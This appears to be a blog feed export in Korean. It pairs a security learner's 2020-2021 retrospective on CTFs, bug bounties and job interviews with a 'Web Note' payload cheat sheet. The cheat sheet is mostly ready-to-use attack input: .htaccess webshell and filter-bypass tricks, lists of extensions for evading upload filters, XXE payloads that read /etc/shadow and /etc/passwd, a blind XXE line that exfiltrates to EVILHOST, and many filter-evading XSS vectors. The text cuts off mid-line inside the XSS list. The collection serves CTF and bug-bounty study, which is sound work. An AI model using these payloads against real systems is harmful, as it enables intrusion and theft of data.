        <content type="html"><![CDATA[<p><strong>페이스북을 들어가보니 티오리에서 회고록을 쓴 것을 읽어보았습니다. 글을 읽고 저도 처음으로 회고록과 앞으로의 계획들을 써봐야겠다고 생각이 들었습니다.</strong></p><hr><h2 id="2020년-회고"><a href="#2020년-회고" class="headerlink" title="2020년 회고"></a>2020년 회고<br></h2><p><span style="color:#21C587">#</span> January ~ March<br></p><p><strong>2020년에는 여태 살아왔던 해를 비교해서 제일 열심히 살았고, 많은 성장을 했던 해인 거 같습니다. 처음에는 솔직히 “내가 이것을 잘 할 수 있을 까?”라는 의심을 가지며 시작했지만 하루 하루가 지나며 다행히도 의심은 사라졌고, 그 의심이 더 힘이 되어준 거 같습니다. 그리고 1월부터 3월까지 통틀어서 제일 다행과 동시에 좋았던 것은 좋은 사람을 만났던 것 입니다. 야미라는 갓님과 첫 약속을 친구와 함께 어느 술집에서 시작해서 지금까지 지내오고, 또 떡볶이좋아라는 형님도 학교 선배인 것을 알게 되어, 학교를 입학하기 전에 만나서 밥을 먹으며 이런 저런 이야기를 나누었습니다. (물론 술집에서) 이렇게 1월부터 3월은 좋은 사람들을 만나며 아주 좋은 시작을 했습니다. </strong><br></p><p><span style="color:#21C587">#</span> April ~ June<br></p><p><strong>그렇게 코로나와 함께 3월까지 개인 공부를 하다가 4월 쯤에 학교를 첫 입학하게 되었습니다. 우리 학교만 이상하게 코로나인데도 4월에 입학을 했다는 거에 매우 불만이였지만, 처음으로 학교를 간 날 기적 같은 일이 일어났습니다. 이날 학교를 마치고 부대찌게 집에서 친구와 Jsec님(학교 선배)과 함께 밥을 먹으면서 이런 저런 이야기를 하며 친해졌고, Jsec님에게 여러가지 질문을 하며 보안 공부를 했었습니다. 그리고 4월인가 비가 올 때 쯤에 Jsec님이 강남 **빌딩에서 강의를 한다고 저보고 와서 들으라고 하셔서 가서 CTF 문제 풀이 강의를 듣게 되었는데, 이때 너무 많은 것들을 배우고, 또 이 날 CTF의 첫 눈을 떠버렸었습니다. 이 날 이후로 CTFTIME을 통해 여러가지 CTF 대회들을 참여하기 시작했었습니다.</strong><br></p><p><span style="color:#21C587">#</span> July ~ September<br></p><p><strong>7월에는 학교 기말고사가 끝나고, 학교를 계속 다닐 지 그만 다닐 지 고민을 잠시 했었습니다. 학교에서 배우면 시간적으로 너무 아깝고, 또 딥하게 배우는 데는 그냥 혼자하는 게 더 좋을 거 같다는 생각이 들어서 결국 자퇴하고, 무작정 취업 준비로 들어갔습니다. 이때 자만감의 취해 회사를 지원하면 어디든 붙겠지~ 라는 생각으로 지원을 했습니다. 그런데 아니나 다를 까 처음 지원한 회사에 바로 붙어 첫 면접을 준비했던 것 입니다. 타이거팀이라는 기업인데 여튼 뭐 면접에서 불합격을 받으며 제 자신의 위치를 다시 확인하는 좋은 경험이였습니다. 그리고 9월에는 김종민멘토님께 연락을 해 대외 활동 관련해서 이야기를 하다가 갓멘토님께서 보안팀 하나를 추천해주셔서 N0Named라는 보안팀의 인턴으로 들어가게 되었습니다.</strong><br></p><p><span style="color:#21C587">#</span> October ~ December<br></p><p><strong>10월, 11월에는 지니온, 시큐어루트라는 회사에 1차 서류를 합격해서 면접을 보게 되었습니다! 과연 결과는….? 광탈! 이때는 정말 면접을 잘 봤다고 생각을 했는데 면접관님께서는 그렇게 안 보이셨나 봅니다. 여튼 이렇게 후반부에 2개의 회사에 불합격을 받아 다시 한 번 충격을 받고, N0Named 보안팀의 인턴 활동을 더 열심히 했었습니다. 하지만 개인적인 집안 사정 때문에 12월에 한 번 더 내부 세미나를 참석하지 못 해 인턴에서 2쿠를 당하고, 집안 일을 도우며 12월을 보냈고, 중간에 또 좋은 분을 만나서 SUA의 운영진으로 들어가 활동하고 있습니다.</strong><br></p><p><span style="color:#21C587">#</span> Bug Bounty<br></p><p><strong>2020년 12월 22일에 해커원이라는 플랫폼에서 특정 사이트를 선정해 버그바운티를 진행했습니다.  이날 정말 운 좋게 Reflected XSS를 발견했습니다! 흑흑 하지만 해당 취약점은 self xss이기 때문에 시나리오를 작성해 공격을 연계해는 게 쉽지 않아 결국 바운티를 받지 못 했습니다. 아닛 로그인 기능도 없어 세션 탈취도 못 하고,, 너무 아쉬웠지만 버그바운티를 하며 처음으로 재미를 느꼈기 때문에 나쁘지는 않았습니다. 아마 바운티를 받았다면 이거 보다 몇 억배는 행복할 거 같았는데 여튼 아쉬웠습니다.</strong><br></p><p><span style="color:#21C587">#</span> CTF<br></p><p><strong>2020년 4월쯤에 Jsec 님의 Pico CTF 강의를 직관으로 보고, 듣고 하면서 첫 CTF의 눈을 뜨게 되었습니다. 이때는 보안을 시작한 지 한 달 정도 됐던 때라서 CTF를 처음 접해보았습니다. 그러다가 CTFTIME이라는 플랫폼을 알게 되었고, 해당 플랫폼을 통해서 CTF 대회를 출전하게 되었습니다. 물론 수상을 하지 못 할 것은 알지만 그래도 여러가지 배경지식을 쌓기 위해서 개인 공부를 하고, CTF를 혼자 참여를 쭉 해오고 있습니다. CTF를 한 3개월 정도 쭉 나가보니 조금씩 배경 지식과 기술들이 쌓이기 시작해서 쉬운 문제들은 20분 안에, 중간 난이도들은 그래도 3시간 안에는 풀리는 거 같습니다. 또 이렇게 CTF를 나가면서 많이 느낀 건데 저는 전에 한 번 봤던 유형이 아니면 매우 어려움을 겪고 문제를 풀지 못 한다는 것을 느꼈습니다. 연구쪽으로 가고 싶은데 이런 부분에서 많이 약하기 때문에 더 많은 노력을 해야 할 거 같습니다. 그리고 요즘들어서는 가끔 사람들과 같이 대회를 나가고 있고, 1년만 더 노력해서 꼭 한국 대회에서 본선 진출만이라도 하려고 노력하고 있습니다.</strong><br></p><p><span style="color:#21C587">#</span> BOB<br></p><p><strong>이번 6월인가 7월쯤에 BOB 서류를 지원했었습니다. 당시에 지원 서류를 작성할 때는 겸손을 100으로 작성을 하였습니다. 정말 아무 것도 모르지만, 이런 이런 생각을 가지고 있고, 보안을 시작하게 된 이유와 앞으로 이러이러하게 할 계획을 가지고 있다는 식으로 작성을 했었습니다. 당시에는 이게 왜 떨어진 지 몰랐지만 지금 생각해보면 너무 겸손했던 것이 제일 문제점이였던 거 같습니다. 물론 자랑할 실력도 아니고, 자랑할 것도 없지만 공부를 한 지 1주일도 안 된 초등학생 느낌으로 글을 작성해버려서.. 여하튼 이번 년도에 회사를 다니지 않고 있다면 지원서를 조금 더 상세히 작성해서 지원을 할 생각입니다.</strong><br></p><hr><h2 id="2021-회고"><a href="#2021-회고" class="headerlink" title="2021 회고"></a>2021 회고<br></h2><p><span style="color:#21C587">#</span> January 1 ~ 18<br></p><p><strong>2021년 1월 7일에는 재검을 받고, 사회 복무 요원을 받아버렸습니다~ 제일 잘 한 일~ 이렇게 재검을 받고, 사회 복무 요원을 뽑는 모의해킹 회사를 찾아 지원을 했습니다. 운 좋게 한 시큐리티라는 회사에 1차 서류 합격을 받았고, 현재는 면접 날짜를 다시 정해준다고 기다리고 있는 상태입니다. 그리고 또 오펜시브 시큐리티인 디펜스라는 보안 기업에도 서류를 넣었는데,,, 운 좋게 여기도 서류가 붙어버렸습니다. 오펜시브 시큐리티를 가고 싶었는데 이렇게 디펜스라는 기업에 서류를 붙게 돼 좋은 기회를 얻었고, 면접은 1월 21일에 보기로 했습니다. 하지만 해당 기업은 사회 복무 요원으로 채용을 하고 있지 않기 때문에 해당 기업을 나오게 되면 다시 사회 복무 요원을 채용하는 회사로 가야 해서 조금 고민이긴 합니다만 하임시큐리티라는 기업도 병특을 진행하고 있어 디펜스에서 실력을 많이 늘린다면 추 후에 사복요를 하임에서 할 수 있지 않을 까?라는 생각으로 디펜스를 노려보기로 했습니다.</strong><br></p><p><span style="color:#21C587">#</span> Diffense nterview<br></p><p><strong>2021년 1월 21일에 오펜시브 시큐리티인 디펜스에서 면접을 보았습니다. 보안 공부를 하면서 면접을 몇 곳 봐왔지만 이번 면접을 통해서는 매우 많은 것을 느낀 면접이였습니다. 앞 전에 본 면접들은 신입을 뽑아서인 지 면접 난이도도 많이 쉬웠는데, 디펜스 연구원 면접은 평소에 생각해 보지 못 했던 질문들을 받아 많이 당황하였습니다. 하지만 해당 면접은 제가 평소에 늘 원하던 면접 중 하나였습니다. 학벌을 보지 않고, 오로지 내가 무엇을 했고, 어떤 것들을 제보 했으며, 만약 제보를 못 했다면 왜 못 했는 지? 또한 자기가 공부하는 분야에서는 몇 등 안에 드는 지?와 같은 질문들을 받았습니다. 이런 질문에 답을 하는 저를 보며 아직 매우 부족하다는 것을 깨닫았습니다. 앞 전에 본 면접들은 모두 내가 학사, 군대 문제 때문에 떨어졌겠지 라는 생각이 들 정도로 면접 퀄이 좋지 않았는데, 이번에는 개인적으로 면접이 너무 좋았던 거 같습니다. 1년 동안 공부를 더 열심히 해서 내년에 디펜스에 꼭 들어갈 멋진 분들과 함께 연구를 하며 성장할 수 있도록 할 계획입니다. 이번 기회로 처음으로 하나의 기업을 목표로 다시 공부하게 되어 매우 좋습니다. 아 그리고 앞 전에는 모두 면접을 보면서 자기 소개 하라는 거 자체가 이해가 안 갔는데 정말 스타트 업 중에서 좋은 회사는 자기 소개 따윈하지 않는 거 같습니다 ^-^ 물론 다른 기업은 면접을 보지 않아 쓸데 없는 자소를 하는 곳도 많겠지만요.</strong><br></p><hr><h2 id="2021-계획"><a href="#2021-계획" class="headerlink" title="2021 계획"></a>2021 계획<br></h2><p><strong>이제 남은 2021년을 어떻게 이용하냐… 저는 CVE ID 획득, CTF 본선 진출을 목표로 지금보다 더 열심히 공부하며 달려나가 보려고 합니다. 2020년도 많이 뿌듯했지만 2021년은 2020년보다 더 뿌듯한 해가 돼야 하기 때문에 더 빡세게 구르며 살아보려고 합니다. 결론은 공익 공익 공익 만만세!</strong><br></p><hr>]]></content>
      
      
      <categories>
          
          <category> NewYear </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NewYear </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Note</title>
      <link href="2021/01/15/2021-01-15-note/"/>
      <url>2021/01/15/2021-01-15-note/</url>
      
        <content type="html"><![CDATA[<p><strong>워게임, CTF 및 버그바운티를 하다 보면 생각 외로 필요한 것들이 많습니다. 하지만 그 많은 것들을 항상 기억하고 있기는 힘들다는 것을 알고 있기 때문에 앞으로 하나 하나 중요한 페이로드들을 정리를 해나갈 것 이고, 이번 글의 가독성은 저의 기준으로 작성하겠습니다.</strong></p><hr><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess<br></h2><p><span style="color:#21C587">&#35;</span><strong>PHP 엔진을 끄고, PHP 소스 코드를 확인해야 할 경우</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine off</span><br></pre></td></tr></table></figure><p><strong>위와 같이 .htaccess 파일을 업로드 해주면 PHP 코드가 실행이 되지 않고, PHP 코드 자체가 출력이 됩니다.</strong><br><br></p><p><span style="color:#21C587">&#35;</span><strong>php 확장자를 다른 문자열로 변경할 경우</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .burp</span><br></pre></td></tr></table></figure><p><strong>위와 같이 .htaccess 파일을 업로드 하게 되면 burp라는 확장자로 업로드 해도 PHP 코드가 실행됩니다. </strong><br><br></p><p><span style="color:#21C587">&#35;</span><strong>.htaccess 파일 자체를 Webshell로 업로드 할 경우</strong><br><br><span style="color:#21C587">&#35;</span><strong>.htaccess 파일을 업로드 가능하지만 <code>&lt;?php</code>, <code>&lt;?</code>와 같은 문자열을 필터링 할 경우</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#+ADw?php phpinfo()+ADs</span><br></pre></td></tr></table></figure><p><strong>위와 같이 .htaccess 파일을 업로드 할 경우 .htaccess 파일 자체로 Webshell로 사용할 수 있습니다.</strong><br><br></p><p><span style="color:#21C587">&#35;</span><strong>exif_imagetype&#40;&#41; 함수를 이용해 이미지 타입을 검증하는 경우</strong><br><br><span style="color:#21C587">&#35;</span><strong>이미지 사이즈를 검증하는 경우</strong><br><br><span style="color:#21C587">&#35;</span><strong><code>&lt;?</code>, <code>&lt;?php</code>와 같은 문자열을 필터링하는 경우</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 1337</span><br><span class="line">#define test_height 1337</span><br><span class="line">AddType application&#x2F;x-httpd-php .burp</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure><p><strong>위와 같이 .htaccess 파일을 업로드 하면 xbm 파일로 인식을 하기 때문에 exif_imagetype&#40;&#41; 함수에 걸리지 않고, .htaccess 파일을 업로드 할 수 있습니다. 위 파일을 업로드 하고, burp라는 확장자로 Payload를 UTF-7로 인코딩해서 업로드 하면 Webshell 사용이 가능합니다.</strong><br><br></p><p><strong>당연히 Payload를 업로드 할 때도, exif_imagetype&#40;&#41; 함수에 걸리지 않게 하기 위해 <code>#define~</code> 문을 적어줘야 합니다.</strong><br><br></p><hr><h2 id="Upload-Function"><a href="#Upload-Function" class="headerlink" title="Upload Function"></a>Upload Function<br></h2><p><span style="color:#21C587">&#35;</span><strong> Blacklisting Bypass</strong><br></p><ul><li>PHP → <code>.php</code>, <code>.phtm</code>, <code>phtml</code>, <code>.phps</code>, <code>.pht</code>, <code>.php2</code>, <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.shtml</code>, <code>.pahr</code>, <code>.pgif</code>, <code>.inc</code><br></li><li>ASP → <code>.asp</code>, <code>.aspx</code>, <code>.cer</code>, <code>.asa</code><br></li><li>JSP → <code>.jsp</code>, <code>.jspx</code>, <code>.jsw</code>, <code>.jsv</code>, <code>jspf</code><br></li></ul><p><span style="color:#21C587">&#35;</span><strong> Whitelisting Bypass</strong><br></p><ul><li>file.jpg.php</li><li>file.php.jpg</li><li>file.php.blah123jpg</li><li>file.php%00.jpt</li><li>file.php\x00.jpt</li><li>file.php%00</li><li>file.php%20</li><li>file.php%0d%0a.jpg</li><li>file.php/</li><li>file.php.\</li></ul><hr><h2 id="XXE-Original"><a href="#XXE-Original" class="headerlink" title="XXE (Original)"></a>XXE (Original)<br></h2><p><span style="color:#21C587">&#35;</span><strong> XXE Original</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/shadow&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lfi</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">lfi</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE to SSRF</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">system</span> <span class="meta-string">&quot;domain&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ssrf</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">ssrf</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE (XInclude attacks)</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">burp</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">burp</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE (php wrapper)</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=****&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lfi</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">lfi</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="XXE-feat-svg"><a href="#XXE-feat-svg" class="headerlink" title="XXE (feat svg)"></a>XXE (feat svg)<br></h2><p><span style="color:#21C587">&#35;</span><strong> XXE</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issue&quot;</span> &gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;40&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;15&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span>                    </span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Blind XXE &amp; SSRF</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no”?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ENTY</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">XXE</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issue”&gt; ]&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;svg xmlns:svg=”http://www.w3.org/2000/svg&quot;</span> <span class="meta-keyword">xmlns</span>=”http://www.w3.org/2000/svg<span class="meta-string">&quot; xmlns:xlink=&quot;</span>http://www.w3.org/1999/xlink<span class="meta-string">&quot; width=&quot;</span>200<span class="meta-string">&quot; height=”200&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">&lt;image xlink:href=&quot;http://EVILHOST:1337/SSRF?&amp;XXE;&quot; /&gt;</span></span><br><span class="line"><span class="meta">&lt;/svg&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE &amp; XSS</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.1&quot; standlone=&quot;no&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> <span class="meta-string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">baseProfile</span>=<span class="string">&quot;full&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    alert(<span class="string">&quot;XXE &amp; XSS&quot;</span>);</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE &amp; Open Redirect</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">code</span>&gt;</span></span><br><span class="line">  <span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;window.location=&#x27;URL&#x27;&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.rog/200/svg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS<br></h2><p><span style="color:#21C587">&#35;</span><strong> Reflection XSS statement</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">script tag</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert(1)<span class="tag">&lt;/<span class="name">scipt</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">onerror=alert;<span class="keyword">throw</span> <span class="number">1</span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=alert&#125;<span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:;base64,YWxlcnQoMSk=&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">img tag</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">window.alert(1)</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">window[</span>&#x27;<span class="attr">eva</span>&#x27;+&#x27;<span class="attr">l</span>&#x27;](<span class="attr">alert</span>(<span class="attr">1</span>)) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">_</span>=<span class="string">alert,_(/xss/)</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">_</span>=<span class="string">&#x27;e&#x27;</span>+&#x27;<span class="attr">val</span>&#x27;,<span class="attr">_</span>(<span class="attr">alert</span>(<span class="attr">1</span>)) &gt;</span></span><br><span class="line"></span><br><span class="line">svg tag</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41</span>&gt;</span></span><br><span class="line">&lt;svg/onload=setTimeout(&#x27;\141\154\145\162\164\50\61\51&#x27;)&gt;</span><br><span class="line">&lt;svg/onload=&#x27;+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#x27;&gt;</span><br><span class="line">  </span><br><span class="line">details tag</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top.alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[</span>&#x27;<span class="attr">prompt</span>&#x27;](<span class="attr">1</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(</span>&#x27;<span class="attr">alert</span>(<span class="attr">1</span>)&#x27;) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(atob(</span>&#x27;<span class="attr">YWxlcnQoMSk</span>=<span class="string">&#x27;)) &gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;details open ontoggle=eval(&#x27;</span>\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span 